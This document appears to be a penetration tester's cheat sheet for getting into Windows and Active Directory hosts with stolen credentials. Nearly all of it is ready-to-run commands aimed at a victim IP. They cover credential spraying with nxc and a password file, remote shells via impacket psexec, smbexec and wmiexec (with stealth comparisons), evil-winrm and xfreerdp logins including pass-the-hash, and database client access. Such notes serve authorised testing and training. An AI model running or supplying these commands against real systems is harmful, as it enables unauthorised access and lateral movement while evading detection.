#AD_protocol_based_access

# <span style="color:#FF5555">Protocol-Based Access</span>

- Got **SMB creds** → try `psexec.py` → fall back to `wmiexec.py` or `smbexec.py`.
- Got **WinRM** → `evil-winrm` (best).
- Got **RDP** → `xfreerdp` for full GUI access.
- Got **SSH** → `ssh` (standard).
- Got **DB creds** → use DB client (`mssqlclient`, `mysql`, `psql`)
____

# <span style="color:#FF5555">Quick Credential Test - All Protocols</span>

```bash
# Test SMB, WinRM, RDP, SSH, LDAP, MSSQL all at once
nxc smb $VICTIM_IP -u user -p pass
nxc winrm $VICTIM_IP -u user -p pass
nxc rdp $VICTIM_IP -u user -p pass
nxc ssh $VICTIM_IP -u user -p pass
nxc ldap $VICTIM_IP -u user -p pass
nxc mssql $VICTIM_IP -u user -p pass


# --local-auth tells nxc to authenticate using a local account instead of a domain account.
nxc mssql $VICTIM_IP --local-auth -u username -p passwords.txt
```

____
# <span style="color:#FF5555">Accessing Protocol</span>

### <span style="color:#50FA7B">SMB (Port 445)</span>
```bash
# psexec - Creates a service (noisy but reliable)
impacket-psexec $DOMAIN/Administrator@Pass123123@$VICTIM_IP
# smbexec - Fileless, no service creation (stealthier)
impacket-smbexec Administrator:'Ticketmaster1968'@$VICTIM_IP
# wmiexec - Uses WMI (stealthy, no file writes)
impacket-wmiexec Administrator:'Ticketmaster1968'@$VICTIM_IP
```

### <span style="color:#50FA7B">WinRM (Port 5985/5986)</span>
```bash
# HTTP (port 5985)
evil-winrm -i $VICTIM_IP -u Administrator -p 'Ticketmaster1968'
# HTTPS (port 5986) - add -S flag
evil-winrm -S -i $VICTIM_IP -u Administrator -p 'Ticketmaster1968'
# With hash (pass-the-hash)
evil-winrm -i $VICTIM_IP -u Administrator -H 'NTLM_HASH'
```

### <span style="color:#50FA7B">WMI (Port 135, 5985)</span>
```bash
# Same as wmiexec from SMB section
impacket-wmiexec Administrator:'Ticketmaster1968'@$VICTIM_IP
# With hash
impacket-wmiexec Administrator@$VICTIM_IP -hashes :NTLM_HASH
```

### <span style="color:#50FA7B">RDP (Port 3389)</span>
```bash
# Basic connection
xfreerdp /v:$VICTIM_IP /u:Administrator /p:'Ticketmaster1968'
# Full screen + drive redirection
xfreerdp /v:$VICTIM_IP /u:Administrator /p:'Ticketmaster1968' /size:100% /drive:tools,/home/kali/tools
# Pass-the-hash (Restricted Admin Mode)
xfreerdp /v:$VICTIM_IP /u:Administrator /pth:NTLM_HASH
```

### <span style="color:#50FA7B">SSH (Port 22)</span>
```bash
# Standard SSH
ssh Administrator@$VICTIM_IP

# With key
ssh -i private_key Administrator@$VICTIM_IP
```

### <span style="color:#50FA7B">Database Protocols</span>
```bash
# MSSQL (port 1433)
impacket-mssqlclient Administrator:'Ticketmaster1968'@$VICTIM_IP

# MySQL (port 3306)
mysql -u Administrator -p'Ticketmaster1968' -h $VICTIM_IP

# PostgreSQL (port 5432)
psql -h $VICTIM_IP -U Administrator -W
```